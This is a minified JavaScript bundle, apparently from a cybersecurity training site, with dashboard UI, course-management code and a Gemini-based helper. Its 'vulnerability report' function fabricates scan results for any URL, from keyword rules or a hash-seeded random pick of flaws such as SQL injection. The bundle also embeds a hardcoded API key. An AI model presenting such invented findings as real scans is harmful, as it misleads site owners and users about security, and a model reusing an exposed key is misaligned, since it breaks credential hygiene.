gap-4",children:[e.jsxs("button",{className:"flex-1 bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold py-3 px-6 rounded-lg flex items-center justify-center gap-2 transition-all hover:shadow-[0_0_20px_rgba(0,255,136,0.3)]",children:[e.jsx(Bt,{className:"h-4 w-4 fill-current"}),"RESUME MISSION"]}),e.jsx("button",{className:"px-4 py-3 rounded-lg border border-[#00FF88]/20 text-[#00FF88] hover:bg-[#00FF88]/10 transition-colors",children:e.jsx(He,{className:"h-5 w-5"})})]})]})]})]}),e.jsxs(xt,{variant:"glass",className:"border-[#00FF88]/10 bg-[#0A0F0A]",children:[e.jsx(fs,{children:e.jsxs(ms,{className:"flex items-center gap-2 text-[#EAEAEA]",children:[e.jsx(xs,{className:"h-5 w-5 text-[#00FF88]"}),"Mission Progress"]})}),e.jsx(gt,{className:"space-y-6",children:[{label:"Live Security Labs",progress:33,total:"2/6",color:"text-[#00CC66]",bar:"bg-[#00CC66]"},{label:"Skill Assessment",progress:a?.completedAssessment?100:0,total:a?.completedAssessment?"Complete":"Pending",color:"text-[#00B37A]",bar:"bg-[#00B37A]"}].map((d,m)=>e.jsxs("div",{className:"group",children:[e.jsxs("div",{className:"flex justify-between text-sm mb-2",children:[e.jsx("span",{className:"text-[#EAEAEA] font-medium group-hover:text-[#00FF88] transition-colors",children:d.label}),e.jsx("span",{className:"text-[#00B37A] font-mono text-xs",children:d.total})]}),e.jsx("div",{className:"w-full bg-[#000000] rounded-full h-1.5 overflow-hidden border border-[#00FF88]/10",children:e.jsx("div",{className:`${d.bar} h-full rounded-full transition-all duration-1000`,style:{width:`${d.progress}%`}})})]},m))})]})]}),e.jsxs("div",{className:"lg:col-span-4 space-y-8",children:[e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/10 p-4 rounded-xl",children:[e.jsx("p",{className:"text-[10px] text-[#00B37A] uppercase tracking-wider mb-1",children:"Courses"}),e.jsx("p",{className:"text-2xl font-bold text-white",children:n.coursesCompleted})]}),e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/10 p-4 rounded-xl",children:[e.jsx("p",{className:"text-[10px] text-[#00B37A] uppercase tracking-wider mb-1",children:"Certificates"}),e.jsx("p",{className:"text-2xl font-bold text-white",children:n.certificatesEarned})]})]}),e.jsxs("div",{className:"space-y-3",children:[e.jsx("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest px-1",children:"Quick Commands"}),e.jsxs("button",{className:"w-full group bg-[#0A0F0A] hover:bg-[#00FF88]/5 border border-[#00FF88]/20 hover:border-[#00FF88]/50 p-4 rounded-xl flex items-center justify-between transition-all",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"h-8 w-8 rounded bg-[#00FF88]/10 flex items-center justify-center text-[#00FF88]",children:e.jsx(Ua,{className:"h-4 w-4"})}),e.jsx("span",{className:"font-bold text-[#EAEAEA] group-hover:text-white",children:"Take Assessment"})]}),e.jsx(Yt,{className:"h-4 w-4 text-[#00B37A] group-hover:translate-x-1 transition-transform"})]}),e.jsxs("button",{className:"w-full group bg-[#0A0F0A] hover:bg-[#00FF88]/5 border border-[#00FF88]/20 hover:border-[#00FF88]/50 p-4 rounded-xl flex items-center justify-between transition-all",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"h-8 w-8 rounded bg-[#00FF88]/10 flex items-center justify-center text-[#00FF88]",children:e.jsx(tt,{className:"h-4 w-4"})}),e.jsx("span",{className:"font-bold text-[#EAEAEA] group-hover:text-white",children:"View Certificates"})]}),e.jsx(Yt,{className:"h-4 w-4 text-[#00B37A] group-hover:translate-x-1 transition-transform"})]})]}),e.jsxs(xt,{variant:"glass",className:"border-[#00FF88]/10 bg-[#0A0F0A]",children:[e.jsx(fs,{children:e.jsx(ms,{className:"text-sm uppercase tracking-widest text-[#00B37A]",children:"Intel Feed"})}),e.jsx(gt,{children:e.jsx("div",{className:"space-y-6",children:i.length>0?i.map((d,m)=>e.jsxs("div",{className:"relative pl-6 pb-1 last:pb-0 border-l border-[#00FF88]/10 last:border-0",children:[e.jsx("div",{className:`absolute left-[-5px] top-1.5 h-2.5 w-2.5 rounded-full ring-4 ring-black ${d.type==="completion"?"bg-[#00FF88]":d.type==="start"?"bg-[#00CC66]":"bg-[#00B37A]"}`}),e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-[#EAEAEA]",children:d.action}),e.jsx("p",{className:"text-[10px] text-[#00B37A] font-mono mt-0.5",children:Rj(new Date(d.created_at),{addSuffix:!0})})]})]},m)):e.jsx("p",{className:"text-[#00B37A] text-sm italic",children:"No recent intel."})})})]})]})]})]})};class Ij{async createCourse(n){try{console.log("Creating course with data:",n);const{data:s,error:i}=await Z.from("courses").insert([{title:n.title,description:n.description,category:n.category,difficulty:n.difficulty,estimated_hours:n.estimated_hours||0,teacher_id:n.teacher_id,is_published:n.is_published||!1,enrollment_count:0,rating:0}]).select().single();if(i)throw console.error("Supabase error:",i),new Error(`Failed to create course: ${i.message}`);return console.log("Course created successfully:",s),s}catch(s){throw console.error("Create course error:",s),s}}async updateCourse(n,s){try{const{data:i,error:o}=await Z.from("courses").update(s).eq("id",n).select().single();if(o)throw new Error(`Failed to update course: ${o.message}`);return i}catch(i){throw console.error("Update course error:",i),i}}async deleteCourse(n){try{const{error:s}=await Z.from("courses").delete().eq("id",n);if(s)throw new Error(`Failed to delete course: ${s.message}`);return!0}catch(s){throw console.error("Delete course error:",s),s}}async getCoursesByTeacher(n){try{const{data:s,error:i}=await Z.from("courses").select("*").eq("teacher_id",n).order("created_at",{ascending:!1});if(i)throw console.error("Courses query error:",i),new Error(`Failed to fetch teacher courses: ${i.message}`);const{data:o,error:c}=await Z.from("users").select("name, email, profile_image").eq("id",n).single();return c&&console.error("Teacher query error:",c),s?.map(m=>({...m,teacher:o||null}))||[]}catch(s){throw console.error("Get teacher courses error:",s),s}}async getAllCourses(){try{const{data:n,error:s}=await Z.from("courses").select("*, course_modules(*)").eq("is_published",!0).order("created_at",{ascending:!1});if(s)throw new Error(`Failed to fetch courses: ${s.message}`);return n||[]}catch(n){throw console.error("Get all courses error:",n),n}}async getCourseById(n){try{const{data:s,error:i}=await Z.from("courses").select("*, course_modules(*)").eq("id",n).single();if(i)throw new Error(`Failed to fetch course: ${i.message}`);return s||null}catch(s){throw console.error("Get course by id error:",s),s}}async getModuleCount(n){try{const{data:s,error:i}=await Z.from("course_modules").select("id").eq("course_id",n);if(i)throw new Error(`Failed to count modules: ${i.message}`);return s?.length||0}catch(s){throw console.error("Get module count error:",s),s}}async createModule(n){try{const s=await this.getModuleCount(n.course_id);if(s>=10)throw new Error("Maximum module limit (10) reached for this course");const{data:i,error:o}=await Z.from("course_modules").insert([{...n,module_order:s+1,is_published:!1}]).select().single();if(o)throw new Error(`Failed to create module: ${o.message}`);return i}catch(s){throw console.error("Create module error:",s),s}}async updateModule(n,s){try{const{data:i,error:o}=await Z.from("course_modules").update(s).eq("id",n).select().single();if(o)throw new Error(`Failed to update module: ${o.message}`);return i}catch(i){throw console.error("Update module error:",i),i}}async getModulesByCourse(n){try{const{data:s,error:i}=await Z.from("course_modules").select("*").eq("course_id",n).eq("is_published",!0).order("module_order",{ascending:!0});if(i)throw new Error(`Failed to fetch modules: ${i.message}`);return s}catch(s){throw console.error("Get modules error:",s),s}}async updateProgress(n){try{const{data:s,error:i}=await Z.from("user_progress").upsert([n]).select().single();if(i)throw new Error(`Failed to update progress: ${i.message}`);return s}catch(s){throw console.error("Update progress error:",s),s}}async getUserProgress(n,s){try{const{data:i,error:o}=await Z.from("user_progress").select("*").eq("user_id",n).eq("course_id",s);if(o)throw new Error(`Failed to fetch user progress: ${o.message}`);return i}catch(i){throw console.error("Get user progress error:",i),i}}async enrollInCourse(n,s){try{const{data:i,error:o}=await Z.from("course_enrollments").select("*").eq("user_id",n).eq("course_id",s).maybeSingle();if(o&&console.warn("Error checking existing enrollment:",o.message),i)return i;const{data:c,error:d}=await Z.from("course_enrollments").insert([{user_id:n,course_id:s}]).select().single();if(d)throw new Error(`Failed to enroll in course: ${d.message}`);try{const{error:m}=await Z.from("courses").update({enrollment_count:(c.enrollment_count??0)+1}).eq("id",s).select().single();if(m){const{data:f}=await Z.from("courses").select("enrollment_count").eq("id",s).maybeSingle(),x=(f?.enrollment_count??0)+1;await Z.from("courses").update({enrollment_count:x}).eq("id",s)}}catch(m){console.warn("Failed to increment course enrollment_count (non-fatal):",m)}return c}catch(i){throw console.error("Enroll in course error:",i),i}}async getUserEnrollments(n){try{const{data:s,error:i}=await Z.from("course_enrollments").select(`
          *,
          course:courses(
            *,
            teacher:users(name, profile_image)
          )
        `).eq("user_id",n).order("enrolled_at",{ascending:!1});if(i)throw new Error(`Failed to fetch enrollments: ${i.message}`);return s}catch(s){throw console.error("Get user enrollments error:",s),s}}async uploadFile(n,s="courses"){try{const i=n.name.split(".").pop(),o=`${Date.now()}.${i}`,c=`${s}/${o}`,{error:d}=await Z.storage.from("uploads").upload(c,n);if(d)throw new Error(`Failed to upload file: ${d.message}`);const{data:{publicUrl:m}}=Z.storage.from("uploads").getPublicUrl(c);return m}catch(i){throw console.error("Upload file error:",i),i}}}const lt=new Ij,Lj="AIzaSyDaqA3vQ1LI-pM-D4EWqK62BsqwNlBD1dQ",Oj=`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${Lj}`,po=async(a,n)=>{try{const s=[...a,{role:"user",parts:[{text:n}]}],i=await fetch(Oj,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({contents:s,generationConfig:{temperature:.7,topK:40,topP:.95,maxOutputTokens:1024}})});if(!i.ok){const c=await i.json();throw new Error(c.error?.message||"Failed to fetch from Gemini API")}return(await i.json()).candidates[0].content.parts[0].text}catch(s){throw console.error("Gemini API Error:",s),s}},zs={isGeminiEnabled:()=>!0,chat:async(a,n)=>{const s=n?`${n}

${a}`:a;return po([],s)},generateCourseOutline:async a=>{const n=`
      Create a course outline for a course titled "${a.title}".
      Description: ${a.description}
      Category: ${a.category}
      Difficulty: ${a.difficulty}
      Target Audience: Students
      Estimated Hours: ${a.estimated_hours}
      
      Please generate ${a.module_count} modules.
      Detail Level: ${a.detailLevel}
      
      Format the output as a JSON array of objects, where each object has:
      - title: string
      - description: string
      - content: string (a summary of the module content)
      
      Do not include any markdown formatting or code blocks. Just the raw JSON array.
    `,s=await po([],n);try{const i=s.replace(/```json/g,"").replace(/```/g,"").trim();return JSON.parse(i)}catch(i){throw console.error("Failed to parse AI response",i),new Error("Failed to generate valid course outline")}},generateVulnerabilityReport:async a=>{console.log("Generating report for:",a),console.log("API Key present:",!0);try{console.log("Attempting Gemini API call...");const p=`
          Act as an advanced automated security scanner. I will provide a target URL.
          Your task is to perform a simulated heuristic analysis of this target based on its domain name, likely technology stack, and common web vulnerabilities.
          
          Target URL: "${a}"
          
          Generate a realistic vulnerability scan report in JSON format.
          The report should include:
          - score: A number between 0-100 (0 = critical risk, 100 = perfectly secure).
          - summary: A professional executive summary of the security posture.
          - vulnerabilities: An array of objects, each with:
            - type: Name of the vulnerability (e.g., "Reflected XSS", "Missing CSP", "Open Port 21").
            - severity: "critical", "high", "medium", or "low".
            - description: Technical description of the finding.
            - remediation: Actionable advice to fix it.
            
          Rules:
          - If the URL contains "bank", "secure", or "gov", assume a higher security score (70-95) but find subtle issues.
          - If the URL contains "test", "demo", "vuln", or is an IP address, assume a low score (20-60) with obvious flaws.
          - For generic URLs, generate a plausible mix of medium/low issues (score 60-80).
          - Do NOT include markdown formatting or code blocks in the response. Just the raw JSON.
        `,b=await po([],p);console.log("Gemini response received");try{const w=b.replace(/```json/g,"").replace(/```/g,"").trim();return JSON.parse(w)}catch{throw console.error("Failed to parse Gemini response as JSON:",b),new Error("Invalid JSON response from AI")}}catch{console.warn("AI Scan unavailable, switching to offline simulation mode.")}await new Promise(p=>setTimeout(p,1500));let n=0;for(let p=0;p<a.length;p++){const b=a.charCodeAt(p);n=(n<<5)-n+b,n=n&n}const s=Math.abs(n),i=p=>{const b=Math.sin(s+p)*1e4;return b-Math.floor(b)},o=Math.floor(i(1)*60)+30,c=[{type:"SQL Injection (SQLi)",severity:"critical",description:"Input parameter appears vulnerable to union-based SQL injection.",remediation:"Use parameterized queries."},{type:"Reflected XSS",severity:"high",description:"Search query parameter is reflected without sanitization.",remediation:"Implement context-aware output encoding."},{type:"Weak SSL/TLS",severity:"medium",description:"Server supports legacy TLS 1.0 protocol.",remediation:"Disable TLS 1.0/1.1."},{type:"Missing CSP",severity:"medium",description:"Content-Security-Policy header is missing.",remediation:"Implement a strict CSP."},{type:"Open Port 21",severity:"high",description:"FTP port 21 is open and accessible.",remediation:"Close unnecessary ports."},{type:"Server Info Leak",severity:"low",description:"Server header reveals version information.",remediation:"Suppress server version banners."},{type:"Missing X-Frame-Options",severity:"low",description:"Vulnerable to Clickjacking.",remediation:"Add X-Frame-Options header."},{type:"Cookie Security",severity:"medium",description:"Cookies missing Secure/HttpOnly flags.",remediation:"Set security flags on cookies."}],d=Math.floor(i(2)*3)+2,m=[],f=new Set;for(let p=0;p<d;p++){let b=0;do b=Math.floor(i(3+p+b)*c.length);while(f.has(b));f.add(b),m.push(c[b])}let x="";return o>80?x="Target demonstrates a strong security posture with only minor configuration issues detected.":o>50?x="Target has a moderate security posture. Several vulnerabilities were detected that require attention.":x="CRITICAL: Target exhibits significant security flaws. Immediate remediation is recommended.",{score:o,summary:x,vulnerabilities:m}},parseResume:async a=>{const n=`
      Analyze the following resume text and extract key information.
      
      Resume Text: "${a.substring(0,1e4)}"
      
      Please provide:
      1. A list of top 5 relevant technical skills.
      2. A brief summary of professional experience (max 3 sentences).
      3. A high-level professional summary (max 2 sentences).
      
      Format the output as JSON:
      {
        "skills": ["string"],
        "experience": "string",
        "summary": "string"
      }
      
      Do not include markdown formatting. Just the raw JSON.
    `;try{const i=(await po([],n)).replace(/```json/g,"").replace(/```/g,"").trim();return JSON.parse(i)}catch(s){return console.error("Failed to parse resume with AI",s),{skills:["Cybersecurity","Technical Analysis"],experience:"Background in information technology and security operations.",summary:"Dedicated professional with interest in cybersecurity."}}}},Dj=({onSuccess:a,onCancel:n,course:s})=>{const{user:i}=Ie(),[o,c]=v.useState(""),[d,m]=v.useState(!1),[f,x]=v.useState("details"),[p,b]=v.useState({title:s?.title??"",description:s?.description??"",category:s?.category??"",difficulty:s?.difficulty??"beginner",estimated_hours:s?.estimated_hours??0}),[w,j]=v.useState([]),[N,k]=v.useState(!1),[F,T]=v.useState(!1),[R,S]=v.useState(""),[U,z]=v.useState(5),[H,G]=v.useState(!1),[O,V]=v.useState("comprehensive"),[B,ae]=v.useState({title:p.title,description:p.description,category:p.category,difficulty:p.difficulty,estimated_hours:p.estimated_hours}),[xe,ye]=v.useState(null);v.useEffect(()=>{s?lt.getModulesByCourse(s.id).then(I=>{j(I.length>0?I:[{title:"",description:"",content:""}])}).catch(console.error):j([{title:"",description:"",content:""}])},[s]);const ne=I=>{const{name:P,value:K}=I.target;b(le=>P==="estimated_hours"?{...le,estimated_hours:Number(K)}:P==="difficulty"?{...le,difficulty:K}:{...le,[P]:K})},fe=(I,P,K)=>{j(le=>{const q=[...le];return q[I]={...q[I],[P]:K},q})},ie=()=>{if(w.length>=10){c("Maximum limit of 10 modules reached");return}j(I=>[...I,{title:"",description:"",content:""}])},ee=I=>{j(P=>P.filter((K,le)=>le!==I))},M=async I=>{if(I.preventDefault(),c(""),f==="details"){if(!p.title||!p.description||!p.category){c("Please fill in all required course details");return}x("modules");return}m(!0);try{if(w.length===0)throw new Error("Please add at least one module");if(w.find(le=>!le.title||!le.description||!le.content))throw new Error("Please fill in all module fields");let K;s?(K=await lt.updateCourse(s.id,{...p,teacher_id:i?.id}),await Promise.all(w.map((le,q)=>{const se=le;return se.id?lt.updateModule(se.id,{...se,module_order:q+1}):lt.createModule({...se,course_id:s.id,module_order:q+1})}))):(K=await lt.createCourse({...p,teacher_id:i?.id,is_published:!1}),await Promise.all(w.map((le,q)=>lt.createModule({...le,course_id:K.id,module_order:q+1})))),b({title:"",description:"",category:"",difficulty:"beginner",estimated_hours:0}),j([{title:"",description:"",content:""}]),x("details"),a?.(K)}catch(P){const K=P instanceof Error?P.message:String(P);c(K||"Failed to create course")}finally{m(!1)}},W=()=>{c(""),x("details")},Q=async I=>{S(""),T(!0);try{zs.isGeminiEnabled();const P={title:I?.title??B.title??p.title,description:I?.description??B.description??p.description,category:I?.category??B.category??p.category,difficulty:I?.difficulty??B.difficulty??p.difficulty,estimated_hours:I?.estimated_hours??B.estimated_hours??p.estimated_hours,module_count:U,detailLevel:O},le=(await zs.generateCourseOutline(P)).map(q=>({title:q.title||"",description:q.description||"",content:q.content||""}));ye(le.length>0?le:[{title:"",description:"",content:""}])}catch(P){const K=P instanceof Error?P.message:String(P);S(K||"Failed to generate outline with AI")}finally{T(!1)}},E=async I=>{m(!0),c("");try{const P=xe??w;if(P.length===0)throw new Error("No modules generated");if(P.find(q=>!q.title||!q.description||!q.content))throw new Error("Please complete all generated module fields before creating");const le=await lt.createCourse({...p,teacher_id:i?.id,is_published:I});await Promise.all(P.map((q,se)=>lt.createModule({title:q.title,description:q.description,content:q.content,course_id:le.id,module_order:se+1}))),b({title:"",description:"",category:"",difficulty:"beginner",estimated_hours:0}),j([{title:"",description:"",content:""}]),x("details"),a?.(le),k(!1),ye(null)}catch(P){const K=P instanceof Error?P.message:String(P);c(K||"Failed to create AI-generated course")}finally{m(!1)}};return e.jsx("div",{className:"fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50",children:e.jsxs("div",{className:"bg-card rounded-2xl p-8 max-w-2xl w-full max-h-[90vh] overflow-y-auto border border-card",children:[e.jsxs("div",{className:"flex items-center justify-between mb-6",children:[e.jsx("h2",{className:"text-2xl font-bold text-primary",children:"Create New Course"}),e.jsx("button",{onClick:n,className:"text-muted hover:text-contrast transition-colors text-lg font-medium",children:""})]}),e.jsxs("div",{className:"flex items-center mb-6 bg-muted rounded-lg p-4",children:[e.jsxs("div",{className:"flex items-center flex-1",children:[e.jsx("div",{className:`rounded-full h-8 w-8 flex items-center justify-center ${f==="details"?"accent-emerald text-contrast":"bg-muted text-muted"}`,children:"1"}),e.jsx("div",{className:"ml-3",children:e.jsx("div",{className:`font-medium ${f==="details"?"text-contrast":"text-muted"}`,children:"Course Details"})})]}),e.jsx("div",{className:"w-12 h-0.5 bg-card"}),e.jsxs("div",{className:"flex items-center flex-1",children:[e.jsx("div",{className:`rounded-full h-8 w-8 flex items-center justify-center ${f==="modules"?"accent-emerald text-contrast":"bg-muted text-muted"}`,children:"2"}),e.jsx("div",{className:"ml-3",children:e.jsx("div",{className:`font-medium ${f==="modules"?"text-contrast":"text-muted"}`,children:"Course Modules"})})]})]}),o&&e.jsx("div",{className:"mb-4 p-3 bg-red-900/50 border border-red-500 text-red-200 rounded",children:o}),e.jsxs("form",{onSubmit:M,className:"space-y-6",children:[f==="details"?e.jsxs("div",{className:"bg-muted p-6 rounded-lg",children:[e.jsx("h3",{className:"text-lg font-semibold text-primary mb-4",children:"Course Details"}),e.jsxs("div",{className:"mb-4 p-3 bg-card border border-card rounded-lg shadow-sm flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("div",{className:"text-sm font-semibold text-contrast",children:p.title||"Untitled Course"}),e.jsxs("div",{className:"text-xs text-muted",children:[p.category||"No category","  ",p.difficulty]}),p.description?e.jsx("div",{className:"mt-2 text-xs text-muted line-clamp-2",children:p.description}):null]}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsxs("div",{className:"text-xs text-muted",children:["Est. ",p.estimated_hours??0," hrs"]}),e.jsx("button",{onClick:()=>k(!0),className:"px-3 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white rounded-md text-sm",children:"Create with AI"})]})]}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Course Title"}),e.jsx("input",{type:"text",name:"title",value:p.title,onChange:ne,className:"mt-1 block w-full rounded-md bg-card border-card text-contrast shadow-sm focus:outline-none focus:ring-2 focus:ring-amber-500",required:!0})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Description"}),e.jsx("textarea",{name:"description",value:p.description,onChange:ne,rows:3,className:"mt-1 block w-full rounded-md bg-card border-card text-contrast shadow-sm focus:outline-none focus:ring-2 focus:ring-amber-500",required:!0})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Category"}),e.jsx("input",{type:"text",name:"category",value:p.category,onChange:ne,className:"mt-1 block w-full rounded-md bg-card border-card text-contrast shadow-sm focus:outline-none focus:ring-2 focus:ring-amber-500",required:!0})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Difficulty"}),e.jsxs("select",{name:"difficulty",value:p.difficulty,onChange:ne,className:"mt-1 block w-full rounded-md bg-card border-card text-contrast shadow-sm focus:outline-none focus:ring-2 focus:ring-amber-500",required:!0,children:[e.jsx("option",{value:"beginner",children:"Beginner"}),e.jsx("option",{value:"intermediate",children:"Intermediate"}),e.jsx("option",{value:"advanced",children:"Advanced"})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Estimated Hours"}),e.jsx("input",{type:"number",name:"estimated_hours",value:p.estimated_hours,onChange:ne,min:"0",className:"mt-1 block w-full rounded-md bg-card border-card text-contrast shadow-sm focus:outline-none focus:ring-2 focus:ring-amber-500",required:!0})]})]})]})]}):e.jsxs("div",{className:"bg-muted p-6 rounded-lg",children:[e.jsxs("div",{className:"flex justify-between items-center mb-4",children:[e.jsxs("h3",{className:"text-lg font-semibold text-primary",children:["Course Modules (",w.length,"/10)"]}),e.jsxs("button",{type:"button",onClick:ie,disabled:w.length>=10,className:"px-4 py-2.5 btn-primary disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2",children:[e.jsx("svg",{className:"w-5 h-5",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 4v16m8-8H4"})}),"Add Module"]})]}),e.jsx("div",{className:"space-y-6",children:w.map((I,P)=>e.jsxs("div",{className:"p-4 border border-card rounded-lg bg-card relative",children:[e.jsx("div",{className:"absolute top-4 right-4",children:w.length>1&&e.jsx("button",{type:"button",onClick:()=>ee(P),className:"text-red-400 hover:text-red-300",children:"Remove"})}),e.jsxs("h4",{className:"text-md font-medium text-primary mb-4",children:["Module ",P+1]}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Title"}),e.jsx("input",{type:"text",value:I.title,onChange:K=>fe(P,"title",K.target.value),className:"mt-1 block w-full rounded-md bg-card border-card text-contrast shadow-sm focus:outline-none focus:ring-2 focus:ring-amber-500",required:!0})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Description"}),e.jsx("textarea",{value:I.description,onChange:K=>fe(P,"description",K.target.value),rows:2,className:"mt-1 block w-full rounded-md bg-card border-card text-contrast shadow-sm focus:outline-none focus:ring-2 focus:ring-amber-500",required:!0})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Content"}),e.jsx("textarea",{value:I.content,onChange:K=>fe(P,"content",K.target.value),rows:4,className:"mt-1 block w-full rounded-md bg-card border-card text-contrast shadow-sm focus:outline-none focus:ring-2 focus:ring-amber-500",required:!0})]})]})]},P))})]}),e.jsxs("div",{className:"flex justify-end items-center gap-3 mt-6",children:[e.jsx("div",{className:"flex-1 flex gap-3",children:f==="modules"&&e.jsx("button",{type:"button",onClick:W,className:"px-6 py-2.5 bg-transparent text-white border border-slate-600 rounded-md hover:bg-slate-800 focus:outline-none focus:ring-2 focus:ring-slate-500 focus:ring-offset-2 focus:ring-offset-slate-800",children:"Back"})}),e.jsxs("div",{className:"flex gap-3",children:[f==="details"&&e.jsx("button",{type:"button",onClick:()=>k(!0),className:"px-4 py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white rounded-md font-medium",children:"Create with AI"}),e.jsx("button",{type:"button",onClick:n,className:"px-6 py-2.5 bg-transparent text-white border border-slate-600 rounded-md hover:bg-slate-800 focus:outline-none focus:ring-2 focus:ring-slate-500 focus:ring-offset-2 focus:ring-offset-slate-800",children:"Cancel"}),e.jsx("button",{type:"submit",disabled:d,className:`px-8 py-3 text-white rounded-md font-semibold text-base focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-slate-800 disabled:opacity-50 ${f==="details"?"bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 focus:ring-emerald-500 shadow-lg shadow-emerald-500/20":"bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 focus:ring-blue-500 shadow-lg shadow-blue-500/20"}`,children:d?"Creating Course...":f==="details"?e.jsxs("span",{className:"flex items-center gap-2",children:["Next Step",e.jsx("svg",{className:"w-5 h-5",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 5l7 7-7 7"})})]}):"Create Course"})]})]})]}),N&&e.jsx("div",{className:"fixed inset-0 bg-black/50 flex items-center justify-center z-60 p-4",children:e.jsxs("div",{className:"bg-card rounded-xl p-6 w-full max-w-2xl shadow-xl",children:[e.jsxs("div",{className:"flex items-center justify-between mb-4",children:[e.jsx("h3",{className:"text-xl font-semibold",children:"Create Course with AI"}),e.jsx("button",{onClick:()=>{k(!1),ye(null)},className:"text-muted text-lg",children:""})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 mb-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Course Title"}),e.jsx("input",{value:B.title,onChange:I=>ae(P=>({...P,title:I.target.value})),className:"mt-1 block w-full rounded-md bg-card border-card text-contrast p-2"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Category"}),e.jsx("input",{value:B.category,onChange:I=>ae(P=>({...P,category:I.target.value})),className:"mt-1 block w-full rounded-md bg-card border-card text-contrast p-2"})]}),e.jsxs("div",{className:"md:col-span-2",children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Description"}),e.jsx("textarea",{value:B.description,onChange:I=>ae(P=>({...P,description:I.target.value})),rows:3,className:"mt-1 block w-full rounded-md bg-card border-card text-contrast p-2"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Difficulty"}),e.jsxs("select",{value:B.difficulty,onChange:I=>ae(P=>({...P,difficulty:I.target.value})),className:"mt-1 block w-full rounded-md bg-card border-card text-contrast p-2",children:[e.jsx("option",{value:"beginner",children:"Beginner"}),e.jsx("option",{value:"intermediate",children:"Intermediate"}),e.jsx("option",{value:"advanced",children:"Advanced"})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Estimated Hours"}),e.jsx("input",{type:"number",value:B.estimated_hours,onChange:I=>ae(P=>({...P,estimated_hours:Number(I.target.value)})),min:0,className:"mt-1 block w-full rounded-md bg-card border-card text-contrast p-2"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Modules"}),e.jsx("input",{type:"number",min:1,max:12,value:U,onChange:I=>z(Number(I.target.value)),className:"mt-1 w-28 rounded-md bg-card border-card text-contrast p-2"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-muted",children:"Detail level"}),e.jsxs("select",{value:O,onChange:I=>V(I.target.value),className:"mt-1 block w-full rounded-md bg-card border-card text-contrast p-2",children:[e.jsx("option",{value:"brief",children:"Brief"}),e.jsx("option",{value:"normal",children:"Normal"}),e.jsx("option",{value:"comprehensive",children:"Comprehensive"})]})]})]}),R&&e.jsx("div",{className:"mb-3 p-3 bg-red-900/50 border border-red-500 text-red-200 rounded",children:R}),e.jsxs("div",{className:"flex items-center justify-end gap-3",children:[e.jsx("button",{type:"button",onClick:()=>{k(!1),ye(null)},className:"px-4 py-2 bg-transparent border border-slate-600 rounded-md",children:"Cancel"}),e.jsx("button",{type:"button",onClick:()=>Q(),disabled:F,className:"px-4 py-2 bg-indigo-600 text-white rounded-md",children:F?"Generating":"Generate Outline"}),e.jsx("button",{type:"button",onClick:()=>{ye(null),ae({title:"",description:"",category:"",difficulty:"beginner",estimated_hours:0}),k(!1)},className:"px-4 py-2 bg-slate-700 text-white rounded-md",children:"Reset"})]}),xe&&e.jsxs("div",{className:"mt-5 p-4 bg-muted rounded",children:[e.jsx("h4",{className:"font-medium mb-2",children:"Preview Modules"}),e.jsx("div",{className:"grid gap-3 max-h-56 overflow-y-auto",children:xe.map((I,P)=>e.jsxs("div",{className:"p-3 bg-card border border-card rounded",children:[e.jsx("div",{className:"font-semibold",children:I.title}),e.jsx("div",{className:"text-sm text-muted mt-1",children:I.description}),e.jsx("div",{className:"mt-2 text-sm",children:I.content})]},P))}),e.jsxs("div",{className:"flex items-center justify-end gap-3 mt-4",children:[e.jsxs("label",{className:"flex items-center gap-2",children:[e.jsx("input",{type:"checkbox",checked:H,onChange:I=>G(I.target.checked)})," Publish immediately"]}),e.jsx("button",{type:"button",onClick:()=>E(!1),disabled:d,className:"px-3 py-2 bg-amber-600 